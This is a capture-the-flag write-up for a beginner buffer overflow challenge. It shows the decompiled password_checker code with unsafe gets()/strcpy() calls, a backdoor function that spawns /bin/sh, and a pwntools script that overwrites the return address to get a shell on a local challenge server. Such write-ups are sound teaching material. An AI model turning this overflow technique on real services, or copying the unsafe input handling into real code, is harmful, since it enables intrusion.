Charlie forgot his password. Help him to find it.

# Write-up

Firstly, open password_checker in IDA, we can see the reversed assembly code:

```
int password_checker()
{
  int result; // eax
  __int64 s2; // [rsp+0h] [rbp-A0h]
  char v2; // [rsp+8h] [rbp-98h]
  char dest; // [rsp+30h] [rbp-70h]
  char src; // [rsp+60h] [rbp-40h]
  int v5; // [rsp+9Ch] [rbp-4h]

  printf("Enter the password to get in: \n>");
  gets(&src);
  strcpy(&dest, &src);
  s2 = 0x64726F7773736170LL;
  v2 = 0;
  v5 = strcmp(&dest, (const char *)&s2);
  if ( v5 )
    result = printf("This is not the password", &s2);
  else
    result = printf("You got in!!!!", &s2);
  return result;
}
```

We can see that the insecure functions gets() and strcpy() are used.

Then, run `checksec` to identify what protection methods are used by password_checker:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Since `NX` is enabled, we can't write shellcode to the stack and run.

Luckily, by inspecting the program, I was able to find a function called backdoor:

```
int backdoor()
{
  return system("/bin/sh");
}
```

Therefore I can overwrite the return address to the backdoor and get shell.

```
from pwn import *

backdoor_addr = p64(0x0000000000401172)

shellcode = 'A'*0x48
shellcode += backdoor_addr 

io = remote('localhost', 5000)
print io.read()
io.sendline(shellcode)
sleep(1)
io.interactive()
```

# Comment

This challenge is very straightforward and basic. I think it met every requirement to be a entry-level buffer overflow challenge. 

